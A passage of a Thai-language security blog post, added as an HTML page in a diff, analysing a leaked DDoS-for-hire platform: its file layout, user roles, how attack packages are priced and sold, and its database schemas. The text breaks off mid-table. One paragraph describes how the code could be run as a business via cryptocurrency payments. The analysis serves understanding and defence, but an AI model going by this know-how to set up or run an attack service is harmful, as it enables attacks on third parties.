@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Code Note 0x3: DDoS as a Service ::
+        Pandora&#39;s Box
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Code Note คือชุดของบล็อกและโพสต์ซึ่งจะนำโค้ดจากโครงการโอเพนซอร์สมาทำการวิเคราะห์และทำความเข้าใจ ให้ความหมายและข้อเสนอตามจุดประสงค์ของแต่ละโครงการ
+ หากอ้างอิงจากโควตด้านบนซึ่งอธิบายคอนเซ็ปต์ของ Code Note เนื้อหาของบล็อกในครั้งนี้อาจไม่ได้ตรงกับคอนเซ็ปต์เท่าไหร่นักเนื่องจากเนื้อหาโค้ดของเราในวันนี้ไม่ได้มาจากโครงการโอนเพนซอร์ส แต่เป็นโค้ดของแพลตฟอร์ม DDoS as a Service (DDoSaas) ซึ่งหลุดออกมาและมีเผยแพร่อยู่ในอินเตอร์เน็ต ซอร์สโค้ดชุดดังกล่าวสามารถนำไปใช้ทำแพลตฟอร์ม DDoS as a Service ได้ทันทีหากผู้ใช้งานมีเซิร์ฟเวอร์สำหรับใช้โจมตี DDoS อยู่แล้ว
+บทเรียนอย่างหนึ่งที่ผมได้จาก Code Note 0x2: ATPMiniDump และมีอิทธิพลต่อการเขียน Code Note 0x3: DDoS as a Service Platform อย่างมากนั้นคือเราอาจไม่มีความจำเป็นที่จะต้องอ่านโค้ดทุกบรรทัดเพื่อทำความเข้าใจ ดังนั้น Code Note 0x3 นี้จะเน้นไปที่การพูดถึงฟังก์ชันของชุดซอร์สโค้ด ผสมกับมุมมองและแนวคิดของบริการ DDoS as a Service ซึ่งอาจทำให้เราเข้าใจพฤติกรรมของการโจมตีในลักษณะนี้มากขึ้นครับ
+หัวข้อซึ่งเราจะพูดถึงในบล็อกมีดังนี้ครับ
+ Overview Background Commanding the Attack Hacking the Platform  A Hidden Telemetry Authenticated SQL Injection Remote Code Execution via Backdoor Code   Final Note  เนื่องจากชุดซอร์สโค้ดดังกล่าวสามารถนำไปใช้เป็นระบบ frontend ของบริการ DDoS as a Service ได้ทันที ผมขอสงวนการพูดถึงแหล่งที่มาและรายละเอียดอื่น ๆ ที่อาจบ่งชี้หรือเป็นการเผยแพร่ชุดซอร์สโค้ดดังกล่าวไม่ว่าจะเป็นทางตรงหรือทางอ้อมเพื่อป้องกันการนำไปใช้อย่างไม่ถูกต้องครับ"
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://pandora.sh/posts/code-note-0x3-ddos-as-a-service/" />
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css" integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js" integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
+    onload="renderMathInElement(document.body);"></script>
+
+
+<link rel="stylesheet" href="https://pandora.sh/assets/style.css" />
+
+<link rel="stylesheet" href="https://pandora.sh/style.css" />
+
+
+<link
+  rel="apple-touch-icon-precomposed"
+  sizes="144x144"
+  href="https://pandora.sh/img/apple-touch-icon-144-precomposed.png"
+/>
+<link rel="shortcut icon" href="https://pandora.sh/img/favicon.png" />
+
+
+<link href="https://pandora.sh/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://pandora.sh/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://pandora.sh/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://pandora.sh/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://pandora.sh/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://pandora.sh/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Code Note 0x3: DDoS as a Service"/>
+<meta name="twitter:description" content="Code Note คือชุดของบล็อกและโพสต์ซึ่งจะนำโค้ดของโปรแกรมจากโครงการโอเพนซอร์สมาทำการวิเคราะห์และทำความเข้าใจ ให้ความหมายและข้อเสนอแนะ โดย Code Note ในฉบับที่ 0x3 จะเป็นการนำโค้ดของบริการ DDoS as a Service ที่ถูกปล่อย (รั่วไหล) ออกมาวิเคราะห์และตรวจสอบ เพื่อความเข้าใจที่มากขึ้นเกี่ยวกับการดำเนินการของบริการ DDoS as a Service หรือ DDoS for Hire"/>
+
+
+
+<meta property="og:title" content="Code Note 0x3: DDoS as a Service" />
+<meta property="og:description" content="Code Note คือชุดของบล็อกและโพสต์ซึ่งจะนำโค้ดของโปรแกรมจากโครงการโอเพนซอร์สมาทำการวิเคราะห์และทำความเข้าใจ ให้ความหมายและข้อเสนอแนะ โดย Code Note ในฉบับที่ 0x3 จะเป็นการนำโค้ดของบริการ DDoS as a Service ที่ถูกปล่อย (รั่วไหล) ออกมาวิเคราะห์และตรวจสอบ เพื่อความเข้าใจที่มากขึ้นเกี่ยวกับการดำเนินการของบริการ DDoS as a Service หรือ DDoS for Hire" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://pandora.sh/posts/code-note-0x3-ddos-as-a-service/" />
+<meta property="article:published_time" content="2020-11-07T18:35:47+07:00" />
+<meta property="article:modified_time" content="2020-11-07T18:35:47+07:00" /><meta property="og:site_name" content="Pandora&#39;s Box" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >Pandora&#39;s Box</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/archive">Archive</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/archive">Archive</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Code Note 0x3: DDoS as a Service</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-11-07
+        </span>
+
+        
+          
+        
+      
+
+      
+        <span class="post-author"
+          >— Written by P. Boonyakarn</span
+        >
+
+
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <blockquote>
+<p><strong>Code Note</strong> คือชุดของบล็อกและโพสต์ซึ่งจะนำโค้ดจากโครงการโอเพนซอร์สมาทำการวิเคราะห์และทำความเข้าใจ ให้ความหมายและข้อเสนอตามจุดประสงค์ของแต่ละโครงการ</p>
+</blockquote>
+<p>หากอ้างอิงจากโควตด้านบนซึ่งอธิบายคอนเซ็ปต์ของ Code Note เนื้อหาของบล็อกในครั้งนี้อาจไม่ได้ตรงกับคอนเซ็ปต์เท่าไหร่นักเนื่องจากเนื้อหาโค้ดของเราในวันนี้ไม่ได้มาจากโครงการโอนเพนซอร์ส แต่เป็นโค้ดของแพลตฟอร์ม DDoS as a Service (DDoSaas) ซึ่งหลุดออกมาและมีเผยแพร่อยู่ในอินเตอร์เน็ต ซอร์สโค้ดชุดดังกล่าวสามารถนำไปใช้ทำแพลตฟอร์ม DDoS as a Service ได้ทันทีหากผู้ใช้งานมีเซิร์ฟเวอร์สำหรับใช้โจมตี DDoS อยู่แล้ว</p>
+<p><img src="https://i.imgur.com/Ehsa8aR.png#center" alt=""></p>
+<p>บทเรียนอย่างหนึ่งที่ผมได้จาก <a href="https://pandora.sh/posts/code-note-0x2-atpminidump/">Code Note 0x2: ATPMiniDump</a> และมีอิทธิพลต่อการเขียน <strong>Code Note 0x3: DDoS as a Service Platform</strong> อย่างมากนั้นคือเราอาจไม่มีความจำเป็นที่จะต้องอ่านโค้ดทุกบรรทัดเพื่อทำความเข้าใจ ดังนั้น Code Note 0x3 นี้จะเน้นไปที่การพูดถึงฟังก์ชันของชุดซอร์สโค้ด ผสมกับมุมมองและแนวคิดของบริการ DDoS as a Service ซึ่งอาจทำให้เราเข้าใจพฤติกรรมของการโจมตีในลักษณะนี้มากขึ้นครับ</p>
+<p>หัวข้อซึ่งเราจะพูดถึงในบล็อกมีดังนี้ครับ</p>
+<ul>
+<li><a href="#overview">Overview</a></li>
+<li><a href="#background">Background</a></li>
+<li><a href="#commanding-the-attack">Commanding the Attack</a></li>
+<li><a href="#hacking-the-platform">Hacking the Platform</a>
+<ul>
+<li><a href="#a-hidden-telemetry">A Hidden Telemetry</a></li>
+<li><a href="#authenticated-sql-injection">Authenticated SQL Injection</a></li>
+<li><a href="#remote-code-execution-via-backdoor-code">Remote Code Execution via Backdoor Code</a></li>
+</ul>
+</li>
+<li><a href="#final-note">Final Note</a></li>
+</ul>
+<p>เนื่องจากชุดซอร์สโค้ดดังกล่าวสามารถนำไปใช้เป็นระบบ frontend ของบริการ DDoS as a Service ได้ทันที ผมขอสงวนการพูดถึงแหล่งที่มาและรายละเอียดอื่น ๆ ที่อาจบ่งชี้หรือเป็นการเผยแพร่ชุดซอร์สโค้ดดังกล่าวไม่ว่าจะเป็นทางตรงหรือทางอ้อมเพื่อป้องกันการนำไปใช้อย่างไม่ถูกต้องครับ</p>
+<h1 id="overview">Overview</h1>
+<p>ชุดซอร์สโค้ดของแพลตฟอร์ม DDoSaaS ที่เราได้มาดูกันนี้ทำให้บล็อกชุด Code Note ได้มีโอกาสพูดถึงภาษาใหม่ขึ้นมาอีกหนึ่งภาษาคือ PHP หลังจากที่เราได้พูดถึง<a href="https://pandora.sh/posts/code-note-0x1-deathransom/">โค้ดในภาษา Python ไว้ใน Code Note 0x1</a> และ<a href="https://pandora.sh/posts/code-note-0x2-atpminidump/">ภาษา C ไว้ใน Code Note 0x2</a> ชุดซอร์สโค้ดนี้ถูกพัฒนาโดยใช้ภาษา PHP ดั้งเดิม ไม่มีการใช้ framework ใดเสริมในส่วนของ backend การแจกจ่ายชุดซอร์สโค้ดนี้ยังมาพร้อมกับไฟล์ฐานข้อมูลที่จำเป็นต่อการใช้งานด้วย</p>
+<p>เนื่องจากโครงสร้างไฟล์ของชุดซอร์สโค้ดนี้มีขนาดที่ใหญ่ ผมจะขอแสดงโครงสร้างไฟล์เฉพาะที่เลเวลที่ให้ข้อมูลที่พอจำเป็น เพื่อให้เห็นตำแหน่งของไฟล์ไว้ใช้อ้างอิงในส่วนเนื้อหาต่อไปครับ</p>
+<pre><code>.
+|-- DB
+|   `-- stresser.sql
+|-- acc.php
+|-- admin
+|   |-- alogs.php
+|   |-- api.php
+|   |-- apil7.php
+|   |-- aplogs.php
+|   |-- customers.php
+|   |-- dnsapi.php
+|   |-- dwhitelist.php
+|   |-- edit-user.php
+|   |-- editapi.php
+|   |-- editapil7.php
+|   |-- editdns.php
+|   |-- editdw.php
+|   |-- editemail.php
+|   |-- editen.php
+|   |-- editew.php
+|   |-- editgeo.php
+|   |-- editip2s.php
+|   |-- editip2sw.php
+|   |-- editmeth.php
+|   |-- editphone.php
+|   |-- editplan.php
+|   |-- editpw.php
+|   |-- editskype.php
+|   |-- editskypes.php
+|   |-- editsw.php
+|   |-- edittoe.php
+|   |-- editvpn.php
+|   |-- emailapi.php
+|   |-- emailw.php
+|   |-- error_log
+|   |-- foot.php
+|   |-- general.php
+|   |-- geoapi.php
+|   |-- gifts.php
+|   |-- header.php
+|   |-- index.php
+|   |-- ip2sapi.php
+|   |-- ip2whitelist.php
+|   |-- llogs.php
+|   |-- methods.php
+|   |-- news.php
+|   |-- panel.php
+|   |-- phoneapi.php
+|   |-- phonew.php
+|   |-- plans.php
+|   |-- plogs.php
+|   |-- skypeapi.php
+|   |-- skypedbapi.php
+|   |-- skypeetoeapi.php
+|   |-- skypew.php
+|   |-- support.php
+|   |-- ticket.php
+|   |-- useractivity.php
+|   `-- vwhitelist.php
+|-- boottest.php
+|-- dashboard.php
+|-- error_log
+|-- gift.php
+|-- h.php
+|-- includes
+|   |-- db.php
+|   |-- functions.php
+|   |-- index.php
+|   |-- init.php
+|   |-- kekmth
+|   |   `-- user
+|   |       `-- giftcodes
+|   |           |-- error_log
+|   |           `-- redeem.php
+|   `-- waf.php
+|-- index.php
+|-- login.jpg
+|-- login.php
+|-- login.png
+|-- logo.svg
+|-- logout.php
+|-- news.php
+|-- php.ini
+|-- purchase.php
+|-- register.php
+|-- rocket1.png
+|-- s.php
+|-- staff
+|   |-- alogs.php
+|   |-- customers.php
+|   |-- edit-user.php
+|   |-- header.php
+|   |-- index.php
+|   |-- llogs.php
+|   |-- plogs.php
+|   |-- support.php
+|   |-- ticket.php
+|   `-- useractivity.php
+|-- stress.php
+|-- t.php
+`-- test.php
+</code></pre><p>จากโครงสร้างของซอร์สโค้ด เราจะสังเกตได้ว่าซอร์สโค้ดมีการแบ่งฟังก์ชันตาม role ที่จะมีในระบบ ได้แก่ ผู้ใช้งานทั่วไปที่ผ่านการสมัครสมาชิกแล้ว (member), ผู้ใช้งานกลุ่มที่เป็นเจ้าหน้าที่ของระบบ (staff) และผู้ใช้งานที่เป็นกลุ่มผู้ดูแลระบบ (admin)</p>
+<p><img src="https://i.imgur.com/6LmeRmz.png#center" alt=""></p>
+<p>รายละเอียดของไฟล์โดยคร่าวมีตามรายการดังนี้</p>
+<ul>
+<li>ภายใต้ไดเรกทอรี <code>admin</code> เป็นกลุ่มของไฟล์สำหรับการตั้งค่าระบบ ผู้โจมตีสามารถติดตามพฤติกรรมการใช้งานของผู้ใช้งานทั่วไปในระบบได้ว่ามีการใช้ DDoSaaS เพื่อโจมตีระบบใด, จัดการระบบสมาชิกและแก้ไขการตั้งค่าต่างๆ ของบัญชีผู้ใช้งาน, จัดการการเชื่อมต่อไปยังเซิร์ฟเวอร์ API ซึ่งส่วนของเซิร์ฟเวอร์ที่จะควบคุมการโจมตีจริง , ดูรายได้ที่ได้จากบริการ, ปรับแต่งแผนการขายและอื่นๆ</li>
+<li>ภายใต้ไดเรกทอรี <code>includes</code> เป็นกลุ่มของไฟล์ที่เกี่ยวข้องกับการทำงานหลักของระบบ เช่น การเชื่อมต่อกับฐานข้อมูล, ฟังก์ชันการ redeem, ฟังก์ชันดึงข้อมูลที่เกี่ยวข้องกับบัญชีผู้ใช้ต่างๆ รวมไปถึงฟังก์ชันของ web application firewall ซึ่งมีตัวเลือกสำหรับการตั้งค่าอยู่ใน directory นี้</li>
+<li>ภายใต้ไดเรกทอรี <code>staff</code> เป็นกลุ่มของไฟล์สำหรับกลุ่มเจ้าหน้าที่ของระบบ กลุ่มเจ้าหน้าที่ของระบบจะมีสิทธิ์ต่ำกว่าผู้ดูแลระบบ โดยมีหน้าที่ในการตรวจสอบความเรียบร้อยและตอบปัญหาของผู้ใช้งาน ไม่สามารถแก้ไขการตั้งค่าของผู้ใช้งานหรือเปลี่ยนข้อมูลของระบบได้</li>
+<li>ไฟล์ซึ่งอยู่นอกเหนือไดเรกทอรีใดๆ โดยทั้งหมดทำหน้าที่เกี่ยวพันกับการทำงานของระบบตาม storyboard การใช้งานระบบทั่วไป เช่น การแสดงข้อมูลแพลนการโจมตี, ระบบสมาชิก, ระบบตั้งค่าโจมตีและเริ่มโจมตีและระบบสำหรับติดต่อผู้ดูแลระบบเมื่อเกิดปัญหาในการใช้งาน</li>
+</ul>
+<p>ชุดซอร์สโค้ดมีการใช้ไลบรารีสำหรับเชื่อมต่อกับระบบของ Paypal เพื่อจัดการการโอนเงินเพื่อซื้อบริการ อย่างไรก็ตามซอร์สโค้ดที่เราได้รับมาดูเหมือนจะขาดฟังก์ชันซึ่งทำให้ระบบสามารถรองรับการซื้อแพ็คเกจการโจมตีหรือปรับเปลี่ยนแพ็คเกจได้จริง</p>
+<p>หากนำซอร์สโค้ดในส่วนนี้ไปใช้จริง วิธีการหนึ่งซึ่งอาจเป็นไปได้โดยไม่จำเป็นต้องเขียนโค้ดใดๆ เพิ่มคือการรับการซื้อบริการผ่านทาง cryptocurrency โดยให้ผู้ที่ต้องการซื้อบริการส่งรายละเอียดการโอนเงินมา เมื่อผู้ดูแลตรวจสอบแล้วว่าการซื้อบริการนั้นเกิดขึ้นอย่างถูกต้อง ผู้ให้บริการก็ดำเนินการเพียงแค่เข้าไปแก้ไขอัตราการใช้งานของผู้ใช้บริการตามเงื่อนไขของการให้บริการต่อ</p>
+<h1 id="background">Background</h1>
+<p>บริการ DDoS as a Service (DDoSaaS) หรือ DDoS for Hire เป็นที่รู้จักกันในหลายชื่อ แต่โดยส่วนใหญ่แล้วในโฆษณาซึ่งผู้ให้บริการใช้ประกาศเรียกหาลูกค้านั้นมักจะใช้คำว่า <strong>Stresser</strong> หรือ <strong>Booster</strong> มากกว่าการเรียกว่าเป็นบริการ DDoS as a Service โดยตรง</p>
+<p><img src="https://i.imgur.com/lsNcdVu.png#center" alt=""></p>
+<p>แนวทางการทำธุรกิจของบริการ DDoSaaS นั้นอยู่ที่การขายการเข้าถึงเครื่องมือและทรัพยากรให้แก่ผู้ที่ต้องการทำการโจมตี DDoS ผู้ใช้บริการสามารถเช่าบริการ DDoSaaS เพื่อโจมตีเป้าหมายที่ต้องการได้ตามระยะเวลาหรือตามเงื่อนไขการให้บริการที่กำหนด ในฝั่งของผู้ให้บริการก็จะมีการแบ่งลักษณะหรือรูปแบบของการขายออกเป็นแพ็คเกจหรือออกโปรโมชันเพื่อจูงใจให้มีการซื้อหรือเป็นเงื่อนไขในการทำกำไร โดยเงื่อนไขที่มักจะถูกใช้ในการทำแพ็คเกจบริการมีดังนี้</p>
+<ol>
+<li><strong>จำนวนเป้าหมาย</strong> บริการ DDoSaaS บางบริการจำกัดจำนวนเป้าหมายที่ผู้ใช้งานสามารถระบุต่อการโจมตีในหนึ่งครั้งเอาไว้ การจ่ายเงินมากขึ้นจะทำให้ผู้ใช้งานสามารถโจมตีเป้าหมายได้มากขึ้น</li>
+<li><strong>ปริมาณการโจมตีต่อวัน</strong> บริการ DDoSaaS อาจมีการจำกัดปริมาณการโจมตีต่อวันเอาไว้ด้วยหน่วยของเวลาหรือปริมาณการส่งออกข้อมูล โดยจะมีการเพิ่มปริมาณการโจมตีต่อวันหากผู้ใช้งานมีการซื้อบริการในราคาที่สูง</li>
+<li><strong>ระยะเวลาในการโจมตี</strong> บริการ DDoSaaS อาจมีการระบุกำลังในการโจมตีเป็นค่าที่ตายตัวเอาไว้ แต่อาจจำกัดระยะเวลาในการโจมตีแทน ในบางกรณีผู้ใช้งานสามารถแบ่งรอบการโจมตีได้ภายใต้เวลาของแพ็คเกจการโจมตีที่ซื้อมา เช่น แพ็คเกจแบบ Basic plan อาจให้เวลาในการโจมตีทั้งหมด 10 นาทีโดยการันตีปริมาณการโจมตีเอาไว้ ผู้ใช้งานสามารถแบ่งรอบภายใต้เงื่อนไข 10 นาทีออกเป็นการโจมตีหลายรอบได้ หรือใช้ 10 นาทีเป็นการโจมตีรอบเดียวก็ได้เช่นเดียวกัน</li>
+<li><strong>กำลังในการโจมตี</strong> หรือ Attack power มักเป็นปัจจัยหลักในการแบ่งราคา ผู้ให้บริการมักจะมีการการันตีกำลังในการโจมตีเอาไว้เป็นช่วงที่แตกต่างกันตามหน่วยต่าง ๆ อาทิ Request per second (Rqps), Gigabit per second (Gbps) หรือ packets per second (Pps) ซึ่งโดยส่วนใหญ่สำหรับแพ็คเกจแบบ Basic plan กำลังในการโจมตีมักถูกขายอยู่ในช่วง 80,000 - 120,000 Rqps หรือ 10 - 30 Gbps หรือ 1,000,000 Pps</li>
+<li><strong>จำนวนการโจมตีในหนึ่งช่วงเวลา</strong> หรือ Concurrent attack ในกรณีทั่วไปนั้น หากผู้ใช้งานซื้อบริการแบบ Basic plan ผู้ให้บริการอาจจะให้เซิร์ฟเวอร์หนึ่งกลุ่มซึ่งมีอยู่ประมาณไม่เกิน 5 ระบบในการโจมตี การเพิ่มจำนวนการโจมตีในหนึ่งช่วงเวลาจะทำให้ผู้ใช้บริการได้สิทธิ์ในการใช้เซิร์ฟเวอร์กลุ่มอีก (หรือเพิ่มขึ้นมาครั้งละ 5 ระบบ) ในการช่วยโจมตีได้</li>
+<li><strong>โปรโตคอลที่ใช้ในการโจมตี</strong> มักเป็นฟีเจอร์พื้นฐานที่ผู้ใช้งานสามารถเลือกใช้ได้ฟรีในทุกแพ็คเกจการโจมตี บริการ DDoSaaS มักแบ่งโปรโตคอลการที่ใช้ในการโจมตีให้ผู้ใช้งานได้เลือกใช้ตามลักษณะดังนี้
+<ol>
+<li>โปรโตคอลในเลเยอร์ที่ 4 (L4) แยกตัวเลือกเป็น TCP และ UDP โดยอาจมีฟีเจอร์ของโปรโตคอลในแต่ละแบบซึ่งอาจส่งผลกระทบต่อการโจมตีให้เลือกด้วย</li>
+<li>โปรโตคอลในเลเยอร์ที่ 7 (L7) มักมีตัวเลือกเป็น HTTP หรือ DNS และอาจมีการใช้เทคนิคเข้ามาช่วย เช่น การทำ Amplification attack</li>
+</ol>
+</li>
+<li><strong>ฟีเจอร์เสริม</strong> เช่น ฟีเจอร์ในการ Bypass โซลูชันป้องกันการโจมตี DDoS หรือฟีเจอร์ในการเลือกประเทศที่จะทำการโจมตีได้</li>
+</ol>
+<p>การจ่ายเงินเพื่อซื้อบริการ DDoSaaS สามารถทำได้หลายรูปแบบทั้งผ่านบริการ Paypal หรือผ่าน Cryptocurrency ผู้ให้บริการมักมีช่องทางในการติดต่อเพื่อให้ผู้ใช้บริการยืนยันหรือแจ้งให้ผู้ให้บริการทราบเมื่อกระบวนการโอนเงินเสร็จแล้ว</p>
+<p><img src="https://i.imgur.com/EKSeeE6.png#center" alt=""></p>
+<p>เนื่องจากผู้ให้บริการ DDoSaaS นั้นเป็นผู้ให้เช่าบริการเพื่อโจมตี ความโปร่งใสในการใช้บริการหรือการรับรองว่าการโจมตีที่ซื้อบริการนั้นจะมีประสิทธิภาพจริงเป็นเรื่องที่เกิดขึ้นได้ยาก บริการ DDoSaaS โดยส่วนใหญ่พึ่งพาอาศัยเครือข่ายของระบบ Botnet หรือระบบ Zombies ซึ่งสามารถนำมาใช้โจมตีได้มาขายเป็นบริการ ความมั่นคงของตัวบริการเองหรือเสถียรภาพในการโจมตีเองจึงเป็นสิ่งที่ไม่สามารถรับประกันได้ว่าผู้ซื้อบริการจะได้รับสินค้าหรือบริการตามที่คาดหวังจริง</p>
+<h1 id="commanding-the-attack">Commanding the Attack</h1>
+<p>เมื่อผู้ใช้บริการทำการสมัครสมาชิกและซื้อแพ็คเกจการให้บริการจากบริการ DDoSaaS แล้ว ผู้ให้บริการจะทำการกำหนดปริมาณและเงื่อนไขการใช้งานไว้ในฐานข้อมูล ซึ่งจะทำให้ผู้ใช้งานสามารถเข้าถึงหน้าเพจ <code>stress.php</code> ซึ่งใช้ควบคุมการโจมตีได้</p>
+<p><img src="https://i.imgur.com/k2WDTsp.png#center" alt=""></p>
+<p>ตัวอย่างด้านล่างคือโครงสร้างของตาราง <code>payments</code>, <code>plans</code> และ <code>users</code> ในฐานข้อมูลซึ่งแสดงให้เห็นโครงสร้างซึ่งบันทึกการจ่ายเงินเพื่อซื้อบริการของผู้ใช้และแพ็คเกจการโจมตีที่ผู้ใช้งานสามารถใช้ได้ในตาราง <code>payments</code> ลักษณะของแพ็คเกจการให้บริการในตาราง <code>plans</code> และสถานะของผู้ใช้งานในตาราง <code>users</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#75715e">-- ----------------------------
+</span><span style="color:#75715e">-- Table structure for payments
+</span><span style="color:#75715e">-- ----------------------------
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">DROP</span> <span style="color:#66d9ef">TABLE</span> <span style="color:#66d9ef">IF</span> <span style="color:#66d9ef">EXISTS</span> <span style="color:#f92672">`</span>payments<span style="color:#f92672">`</span>;
+<span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">TABLE</span> <span style="color:#f92672">`</span>payments<span style="color:#f92672">`</span>  (
+  <span style="color:#f92672">`</span>ID<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span> AUTO_INCREMENT,
+  <span style="color:#f92672">`</span>paid<span style="color:#f92672">`</span> float <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>plan<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span><span style="color:#66d9ef">user</span><span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>email<span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">60</span>) CHARACTER <span style="color:#66d9ef">SET</span> latin1 <span style="color:#66d9ef">COLLATE</span> latin1_swedish_ci <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>tid<span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">30</span>) CHARACTER <span style="color:#66d9ef">SET</span> latin1 <span style="color:#66d9ef">COLLATE</span> latin1_swedish_ci <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>date<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#66d9ef">PRIMARY</span> <span style="color:#66d9ef">KEY</span> (<span style="color:#f92672">`</span>ID<span style="color:#f92672">`</span>) <span style="color:#66d9ef">USING</span> BTREE
+) ENGINE <span style="color:#f92672">=</span> MyISAM AUTO_INCREMENT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> CHARACTER <span style="color:#66d9ef">SET</span> <span style="color:#f92672">=</span> latin1 <span style="color:#66d9ef">COLLATE</span> <span style="color:#f92672">=</span> latin1_swedish_ci ROW_FORMAT <span style="color:#f92672">=</span> <span style="color:#66d9ef">Dynamic</span>;
+
+<span style="color:#75715e">-- ----------------------------
+</span><span style="color:#75715e">-- Table structure for plans
+</span><span style="color:#75715e">-- ----------------------------
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">DROP</span> <span style="color:#66d9ef">TABLE</span> <span style="color:#66d9ef">IF</span> <span style="color:#66d9ef">EXISTS</span> <span style="color:#f92672">`</span>plans<span style="color:#f92672">`</span>;
+<span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">TABLE</span> <span style="color:#f92672">`</span>plans<span style="color:#f92672">`</span>  (
+  <span style="color:#f92672">`</span>ID<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span> AUTO_INCREMENT,
+  <span style="color:#f92672">`</span>name<span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">50</span>) CHARACTER <span style="color:#66d9ef">SET</span> latin1 <span style="color:#66d9ef">COLLATE</span> latin1_swedish_ci <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>description<span style="color:#f92672">`</span> text CHARACTER <span style="color:#66d9ef">SET</span> latin1 <span style="color:#66d9ef">COLLATE</span> latin1_swedish_ci <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>mbt<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
